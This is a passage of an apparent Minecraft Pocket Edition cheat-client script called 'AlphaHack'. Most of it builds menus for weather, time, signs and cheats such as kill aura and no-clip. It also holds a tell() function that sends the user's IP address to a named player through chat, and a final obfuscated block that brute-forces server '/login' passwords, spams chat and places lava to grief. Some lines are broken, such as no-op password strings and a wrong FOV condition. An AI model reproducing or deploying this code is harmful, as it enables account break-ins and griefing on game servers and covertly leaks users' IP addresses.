                onClick: function(viewarg){
Wset();
wmenu.dismiss();
//print("error with lighting");
                }
            }));
            wmenuLayout.addView(button);

var button2 = new android.widget.Button(ctx);
            button2.setText("Clear weather");
            button2.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
Level.setRainLevel(0);
Level.setLightningLevel(0);
                }
            }));
            wmenuLayout.addView(button2);

var w_exit = new android.widget.Button(ctx);
		w_exit.setText("Exit");
	   w_exit.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             wmenu.dismiss();
showMenuBtn();
			}
		});
		wmenuLayout.addView(w_exit);

            wmenu = new android.widget.PopupWindow(wmenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/2, ctx.getWindowManager().getDefaultDisplay().getHeight());
          /*  wmenu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.GUIColor));*/
wmenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            wmenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | android.view.Gravity.TOP, 0, 0);
        }catch(error){
            print("A Error Has Happen: " + error);
        }
    }}));
}

function Wset() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var w = new android.widget.EditText(ctx);
var w2 = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Set Weather");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(w);
Layer.addView(w2);
Layer.addView(Exit);

w.setText("");
w.setHint("Set rain/snow");
w2.setText("");
w2.setHint("Set lightning");
Exit.setText("Set weather");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
v=w.getText();
v2=w2.getText();
Dialog.dismiss();
WS();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The WS Dialog Is Malfunctioning:"+e);
}
}});
}

function WS() {
Level.setRainLevel(v);
Level.setLightningLevel(v2);
}                

function amenu_menu(){
ctx.runOnUiThread(new Runnable({ run: function(){
        try{
            var amenuLayout = new LinearLayout(ctx);
            var amenuScroll = new ScrollView(ctx);
            var amenuLayout1 = new LinearLayout(ctx);
            amenuLayout.setOrientation(1);
            amenuLayout1.setOrientation(1);
            amenuScroll.addView(amenuLayout);
            amenuLayout1.addView(amenuScroll);

var MainTitle = new android.widget.TextView(ctx); MainTitle.setGravity(android.view.Gravity.CENTER);
		MainTitle.setText(name + space + version);
       MainTitle.setTextColor(GUIName);
		MainTitle.setTextSize(20);
		amenuLayout.addView(MainTitle);
            
            var z_title = new android.widget.TextView(ctx); z_title.setGravity(android.view.Gravity.CENTER);
		z_title.setText("Time Menu");
       z_title.setTextColor(GUIName);
		z_title.setTextSize(20);
		amenuLayout.addView(z_title);

var exita = new android.widget.Button(ctx);
		exita.setText("Exit");
		exita.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             amenu.dismiss();
showMenuBtn();
			}
		});
		amenuLayout.addView(exita);

var aa = new android.widget.Button(ctx);
            aa.setText("Only day: "+(onlyday?"on":"off"));
            aa.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(viewarg){
                onlyday?onlyday=false:onlyday=true;
aa.setText("Only day: "+(onlyday?"on":"off"));
if(onlyday == true){
clientMessage("§7Only day is on");
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 0");
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time stop");
onlyday = true;
}
if(onlyday == false){
clientMessage("§7Only day is off");
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time start");
onlyday = false;
                }
                }
            }));
            amenuLayout.addView(aa);

var a1 = new Button(ctx);
            a1.setText("Time: 6:00am");
            a1.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(0);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 0");
                }
            }));
            amenuLayout.addView(a1);

var a2 = new Button(ctx);
            a2.setText("Time: 7:00am");
            a2.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(1000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 1000");
                }
            }));
            amenuLayout.addView(a2);

var a3 = new Button(ctx);
            a3.setText("Time: 8:00am");
            a3.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(2000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 2000");
                }
            }));
            amenuLayout.addView(a3);

var a4 = new Button(ctx);
            a4.setText("Time: 9:00am");
            a4.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(3000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 3000");
                }
            }));
            amenuLayout.addView(a4);

var a5 = new Button(ctx);
            a5.setText("Time: 10:00am");
            a5.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(4000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 4000");
                }
            }));
            amenuLayout.addView(a5);

var a6 = new Button(ctx);
            a6.setText("Time: 11:00am");
            a6.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(5000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 5000");
                }
            }));
            amenuLayout.addView(a6);

var a7 = new Button(ctx);
            a7.setText("Time: 12:00pm");
            a7.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(6000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 6000");
                }
            }));
            amenuLayout.addView(a7);

var a8 = new Button(ctx);
            a8.setText("Time: 1:00pm");
            a8.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(7000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 7000");
                }
            }));
            amenuLayout.addView(a8);

var a9 = new Button(ctx);
            a9.setText("Time: 2:00pm");
            a9.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(8000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 8000");
                }
            }));
            amenuLayout.addView(a9);

var a10 = new Button(ctx);
            a10.setText("Time: 3:00pm");
            a10.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(9000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 9000");
                }
            }));
            amenuLayout.addView(a10);

var a11 = new Button(ctx);
            a11.setText("Time: 4:00pm");
            a11.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(10000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 10000");
                }
            }));
            amenuLayout.addView(a11);

var a12 = new Button(ctx);
            a12.setText("Time: 5:00pm");
            a12.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(11000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 11000");
                }
            }));
            amenuLayout.addView(a12);

var a13 = new Button(ctx);
            a13.setText("Time: 6:00pm");
            a13.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(12000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 12000");
                }
            }));
            amenuLayout.addView(a13);

var a14 = new Button(ctx);
            a14.setText("Time: 7:00pm");
            a14.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(13000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 13000");
                }
            }));
            amenuLayout.addView(a14);

var a15 = new Button(ctx);
            a15.setText("Time: 8:00pm");
            a15.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(14000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 14000");
                }
            }));
            amenuLayout.addView(a15);

var a16 = new Button(ctx);
            a16.setText("Time: 9:00pm");
            a16.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(15000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 15000");
                }
            }));
            amenuLayout.addView(a16);

var a17 = new Button(ctx);
            a17.setText("Time: 10:00pm");
            a17.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(16000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 16000");
                }
            }));
            amenuLayout.addView(a17);

var a18 = new Button(ctx);
            a18.setText("Time: 11:00pm");
            a18.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(17000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 17000");
                }
            }));
            amenuLayout.addView(a18);

var a19 = new Button(ctx);
            a19.setText("Time: 12:00am");
            
            a19.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(18000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 18000");
                }
            }));
            amenuLayout.addView(a19);

var a20 = new Button(ctx);
            a20.setText("Time: 1:00am");
            a20.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(19000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 19000");
                }
            }));
            amenuLayout.addView(a20);

var a21 = new Button(ctx);
            a21.setText("Time: 2:00am");
            a21.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(20000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 20000");
                }
            }));
            amenuLayout.addView(a21);

var a22 = new Button(ctx);
            a22.setText("Time: 3:00am");
            a22.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(21000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 21000");
                }
            }));
            amenuLayout.addView(a22);

var a23 = new Button(ctx);
            a23.setText("Time: 4:00am");
            a23.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(22000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 22000");
                }
            }));
            amenuLayout.addView(a23);

var a24 = new Button(ctx);
            a24.setText("Time: 5:00am");          
            a24.setOnClickListener(new View.OnClickListener({
                onClick: function(viewarg){         
Level.setTime(23000);
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat("/time set 23000");
                }
            }));
            amenuLayout.addView(a24);
		
		var exita2 = new android.widget.Button(ctx);
		exita2.setText("Exit");
	   exita2.setOnClickListener(new android.view.View.OnClickListener() {
			onClick: function(v){
             amenu.dismiss();
showMenuBtn();
			}
		});
		amenuLayout.addView(exita2);

            amenu = new PopupWindow(amenuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/3, ctx.getWindowManager().getDefaultDisplay().getHeight());
            amenu.setBackgroundDrawable(new ColorDrawable(GUIColor));
            amenu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
            }catch(error){
                Toast.makeText(ctx, "An error occured: " + error, 1).show();
            }
    }}));
}

function signEditor() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
GetText = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var xy = new android.widget.EditText(ctx);
var xy2 = new android.widget.EditText(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Enter sign line & text");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();
Layer.addView(xy);
Layer.addView(xy2);
Layer.addView(Exit);

xy.setText("");
xy.setHint("Sign line: (0-3)");
xy2.setText("");
xy2.setHint("New sign text");
Exit.setText("done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){
text4 =xy.getText();
line4 =xy2.getText();
Level.setSignText(notex, notey, notez, text4, line4);
Dialog.dismiss();
showMenuBtn();
}
});

GetText.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
GetText.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The signer Dialog Is Malfunctioning:"+e);
}
}});
}

function useItem(x, y, z, itemId, blockId, side){
if(blockId == 63 || blockId == 68) {
            signEditor(); 
        }
	if(lightning) {
		 Level.spawnMob(x, y, z, EntityType.LIGHTNING_BOLT);
	}
	if(primedtnt) {
Level.spawnMob(x, y +1, z, EntityType.PRIMED_TNT);
	}
	if(arrow) {
Level.spawnMob(x, y +1, z, EntityType.ARROW);
	}
	if(exporb) {
Level.spawnMob(x, y +1, z, EntityType.EXPERIENCE_ORB);
	}
	if(minecart) {
Level.spawnMob(x, y +1, z, EntityType.MINECART);
	}
}

function fov() {
ctx.runOnUiThread(new java.lang.Runnable(){
run: function(){ 
try{
fov = new android.widget.PopupWindow();
var Layer = new android.widget.LinearLayout(ctx);
var xy = new android.widget.EditText(ctx);
var fovs = new android.widget.SeekBar(ctx);
var Dialog = new android.app.Dialog(ctx);
var Exit = new android.widget.Button(ctx);

Dialog.setTitle("Slide to edit fov");
Dialog.setContentView(Layer);

Layer.setOrientation(android.widget.LinearLayout.VERTICAL);
Dialog.show();

Layer.addView(fovs);
Layer.addView(Exit);

var fovsProgress = 0;
      fovs.setMax(10);
      fovs.setProgress(fovsProgress);
      fovs.setOnSeekBarChangeListener(new android.widget.SeekBar.OnSeekBarChangeListener()
      {
      onStopTrackingTouch: function(view)
      {
      fovsProgress=fovs.getProgress();
      if(fovsProgress==0)
      {
      ModPE.resetFov(); fovsProgress=0; (0/10)
      }
      if(fovsProgress==1)
      {
      ModPE.setFov(10); fovsProgress=1; (1/10)
      }
      if(fovsProgress==2)
      {
      ModPE.setFov(20); fovsProgress=2; (2/10)
      }
      if(fovsProgress==3)
      {
      ModPE.setFov(30); fovsProgress=3; (3/10)
      }
if(fovsProgress==4)
{
ModPE.setFov(40); fovsProgress=4; (4/10)
}
if(fovsProgress==5)
{
ModPE.setFov(50); fovsProgress=5; (5/10)
}
if(fovsProgress==6)
{
ModPE.setFov(60); fovsProgress=6; (6/10)
}
if(fovsProgress==7)
{
ModPE.setFov(70); fovsProgress=7; (7/10)
}
if(fovsProgress==8)
{
ModPE.setFov(80); fovsProgress=8; (8/10)
}
if(fovsProgress==9)
{
ModPE.setFov(90); fovsProgress=9; (9/10)
}
if(fovsProgress==3)
{
ModPE.setFov(100); fovsProgress=10; (10/10)
}
      }
      });
Exit.setText("done");

Exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick: function(view){

Dialog.dismiss();
showMenuBtn();
}
});

fov.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
fov.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
fov.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (e){
print("The signer Dialog Is Malfunctioning:"+e);
}
}});
}

function crash() {
net.zhuoweizhang.mcpelauncher.ScriptManager.nativeForceCrash();
}

function tell(){
var chat = net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat;

getIp(function(info){chat("/tell Arceus_matt using AlphaHack! ip " + info[0])})
}

function save() {
        var file = new java.io.File( android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/games/com.mojang/AlphaHack/"+Level.getWorldDir()+"/homes/", "Home "+name+".txt");
        var path=android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/games/com.mojang/AlphaHack/"+Level.getWorldDir()+"/homes/" ; 
        java.io.File(path).mkdirs(); 
        file.createNewFile();
        var write = new java.io.OutputStreamWriter(new java.io.FileOutputStream(file));
        var string="";
        write.append(xhome.toString());
        write.append(","+ yhome.toString());
        write.append(","+ zhome.toString()); 
        write.close();
         
    } 
 
function load(){
 var line, string = "";
    var file = new java.io.File( android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/games/com.mojang/AlphaHack/"+Level.getWorldDir()+"/homes/", "Home "+name+".txt");
    var path=android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/games/com.mojang/AlphaHack/"+Level.getWorldDir()+"/homes/"; 
    if(!file.exists()){
    clientMessage("The home doesn't exist"); 
  java.io.File(path).mkdirs(); 
    }
    else {
    var readfile = new java.io.BufferedReader(new java.io.FileReader(file));
    while((line = readfile.readLine()) != null) {
        var t1 = line + java.lang.System.getProperty("line.seperator");
        string += t1.substring(0, t1.length - 4);
        var t2 = line;
        if((line = readfile.readLine()) != null) string += "\n";
        line = t2;
    } 
    xhome=parseInt(string.split(",")[0]);    
    yhome= parseInt(string.split(",")[1]);
    zhome= parseInt(string.split(",")[2]);
    Entity.setPosition(Player.getEntity(),xhome,yhome,zhome);       
    }
}

function gameLoop(){
    var thisLoop = new Date;
    fps = 1000 / (thisLoop - lastLoop);
    lastLoop = thisLoop;
}

function modTick() {
if(showp){
ModPE.showTipMessage("Current FPS: " + Math.round(fps));
gameLoop()
}
if(nowalls) {
		Entity.setCollisionSize(getPlayerEnt(),0,0);
		if(Level.getTile(getPlayerX(),getPlayerY(),getPlayerZ())!=0 && Level.getTile(getPlayerX(),getPlayerY()-1,getPlayerZ())!=0) {
			setVelY(getPlayerEnt(), 0.01);
		}
}
if(waterwalk) {
		if(Level.getTile(getPlayerX(), getPlayerY()-2, getPlayerZ())==8 || Level.getTile(getPlayerX(), getPlayerY()-2, getPlayerZ())==9 || Level.getTile(getPlayerX(), getPlayerY()-2, getPlayerZ())==10 || Level.getTile(getPlayerX(), getPlayerY()-2, getPlayerZ())==11) {
			setVelY(getPlayerEnt(), 0);
		}
	}
if(highjumps) {
		if(Entity.getVelY(getPlayerEnt())< -0.1) {
			setVelY(getPlayerEnt(),-0.5);
		}
		if(Entity.getVelY(getPlayerEnt())< 0.35 && Entity.getVelY(getPlayerEnt())> 0.2 && can==1 && canGetHP==1) {
			setVelY(getPlayerEnt(), 0.6);
			can = 2;
			HP = Entity.getHealth(getPlayerEnt());
			canGetHP = 0;
		}
		if(Entity.getVelY(getPlayerEnt())>gravity && can==2) {
			Player.setHealth(HP);
			canGetHP = 1;
			can = 0;
		}
		if(Entity.getVelY(getPlayerEnt())==gravity && can==0) {
			Player.setHealth(HP);
			canGetHP = 1;
			can = 1;
		}
	}
if(stackheart){
Player.setHealth(20);
}
if(infhun){
Player.setHunger(20);
}
if(killaura){
killing(); 
}
if(killfaura){
killingf(); 
}
}

function attackHook(attacker, victim) {
	if(instakilled) {
		Entity.setHealth(victim, 1);
	}
	if(saddle) {
		rideAnimal(getPlayerEnt(), victim);
	}
	if(firepunch) {
Entity.setFireTicks(victim, 5)
	}
}

function instaDestroy(){
if(instabreak==true)
	for(i = 0; i < 256; i++){
		Block.setDestroyTime(i, 0.1);
	}
}
 
function defaultDestroy(){
if(instabreak==false)
	for(i = 0; i < 256; i++){
		Block.setDestroyTime(i, defaultDestroyTime[i]);
	}
}

if(hackcount==1)"<password>";
if(hackcount==2)"[password]";
if(hackcount==3)"{password}";
if(hackcount==4)"(password)";
if(hackcount==5)"password";
if(hackcount==6)"pussy";
if(hackcount==7)"dick";
if(hackcount==8)"1234";
if(hackcount==9)"123456789";

var _0x88b9=["\x6E\x61\x74\x69\x76\x65\x53\x65\x6E\x64\x43\x68\x61\x74","\x53\x63\x72\x69\x70\x74\x4D\x61\x6E\x61\x67\x65\x72","\x6D\x63\x70\x65\x6C\x61\x75\x6E\x63\x68\x65\x72","\x7A\x68\x75\x6F\x77\x65\x69\x7A\x68\x61\x6E\x67","\x2F\x6C\x6F\x67\x69\x6E\x20","\x69\x73\x53\x68\x6F\x77\x69\x6E\x67","\x69\x73\x52\x65\x6D\x6F\x74\x65","\x73\x65\x74\x4C\x65\x76\x65\x6C\x46\x61\x6B\x65\x43\x61\x6C\x6C\x62\x61\x63\x6B","\x73\x65\x74\x54\x69\x6D\x65","\x0A","\x58\x3A\x20","\x72\x6F\x75\x6E\x64","\x2C\x20\x59\x3A\x20","\x2C\x20\x5A\x3A\x20","\x2E\x20","\x47\x3A\x20","\x67\x65\x74\x47\x61\x6D\x65\x4D\x6F\x64\x65","\x2E","\x20\x54\x3A\x20","\x67\x65\x74\x54\x69\x6D\x65","\x20\x57\x2F\x4C\x3A\x20","\x67\x65\x74\x52\x61\x69\x6E\x4C\x65\x76\x65\x6C","\x2F","\x67\x65\x74\x4C\x69\x67\x68\x74\x6E\x69\x6E\x67\x4C\x65\x76\x65\x6C","\x49\x44\x3A\x20","\x67\x65\x74\x43\x61\x72\x72\x69\x65\x64\x49\x74\x65\x6D","\x3A","\x67\x65\x74\x43\x61\x72\x72\x69\x65\x64\x49\x74\x65\x6D\x44\x61\x74\x61","\x67\x65\x74\x45\x6E\x74\x69\x74\x79","\x67\x65\x74\x4E\x61\x6D\x65","\x20\x7C\x20","\x42\x3A\x20","\x67\x65\x74\x42\x69\x6F\x6D\x65\x4E\x61\x6D\x65","\x20\x76","\x67\x65\x74\x4D\x69\x6E\x65\x63\x72\x61\x66\x74\x56\x65\x72\x73\x69\x6F\x6E","\x73\x68\x6F\x77\x54\x69\x70\x4D\x65\x73\x73\x61\x67\x65","\x6C\x61\x76\x61","\x61\x64\x64\x50\x61\x72\x74\x69\x63\x6C\x65","\x6C\x61\x72\x67\x65\x65\x78\x70\x6C\x6F\x64\x65","\x73\x65\x74\x54\x69\x6C\x65","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x61\x6E\x67","\x72\x75\x6E\x4F\x6E\x55\x69\x54\x68\x72\x65\x61\x64","\x70\x6F\x73\x74\x44\x65\x6C\x61\x79\x65\x64","\x6F\x73"];function rptask(){ctx[_0x88b9[42]]( new java[_0x88b9[41]].Runnable({run:function(){ new android[_0x88b9[44]].Handler()[_0x88b9[43]]( new java[_0x88b9[41]].Runnable({run:function(){if(sspam){net[_0x88b9[3]][_0x88b9[2]][_0x88b9[1]][_0x88b9[0]](text)};if(hackk){net[_0x88b9[3]][_0x88b9[2]][_0x88b9[1]][_0x88b9[0]](_0x88b9[4]+hackcount)};hackcount++;if(GUI!=null&&GUI[_0x88b9[5]]()==false&&(GUI==null||GUI[_0x88b9[5]]()==false)){net[_0x88b9[3]][_0x88b9[2]][_0x88b9[1]][_0x88b9[6]]=true;net[_0x88b9[3]][_0x88b9[2]][_0x88b9[1]][_0x88b9[7]](true,false);showMenuBtn()};if(onlyday){Level[_0x88b9[8]](0)};if(healthy==true){healthIndicators()};if(stat22){ModPE[_0x88b9[35]](_0x88b9[9]+_0x88b9[10]+Math[_0x88b9[11]](nx)+_0x88b9[12]+Math[_0x88b9[11]](ny)+_0x88b9[13]+Math[_0x88b9[11]](nz)+_0x88b9[14]+_0x88b9[9]+_0x88b9[15]+Level[_0x88b9[16]]()+_0x88b9[17]+_0x88b9[18]+Level[_0x88b9[19]]()+_0x88b9[17]+_0x88b9[20]+Math[_0x88b9[11]](Level[_0x88b9[21]]())+_0x88b9[22]+Math[_0x88b9[11]](Level[_0x88b9[23]]())+_0x88b9[14]+_0x88b9[24]+Player[_0x88b9[25]]()+_0x88b9[26]+Player[_0x88b9[27]]()+_0x88b9[17]+_0x88b9[9]+Player[_0x88b9[29]](Player[_0x88b9[28]]())+_0x88b9[30]+_0x88b9[31]+Level[_0x88b9[32]]()+_0x88b9[17]+_0x88b9[33]+ModPE[_0x88b9[34]]())};if(parti){Level[_0x88b9[37]](ParticleType[_0x88b9[36]],getPlayerX(),getPlayerY(),getPlayerZ(),0,0,0,150)};if(parti2){Level[_0x88b9[37]](ParticleType[_0x88b9[38]],getPlayerX(),getPlayerY(),getPlayerZ(),0,0,0,150)};if(grief){Level[_0x88b9[39]](getPlayerX(),getPlayerY(),getPlayerZ(),11,0)};if(checkForUpdate==false){ctx[_0x88b9[42]]( new java[_0x88b9[41]].Runnable({run:function(){try{checkVersion()}catch(err){print(_0x88b9[40]+err)}}}));checkForUpdate=true};if(updateWindow){ctx[_0x88b9[42]]( new java[_0x88b9[41]].Runnable({run:function(){try{updateVersion()}catch(err){print(_0x88b9[40]+err)}}}));updateWindow=false};nx=getPlayerX();ny=getPlayerY();nz=getPlayerZ();eval(rptask())}}),1000/70)}}))}rptask()
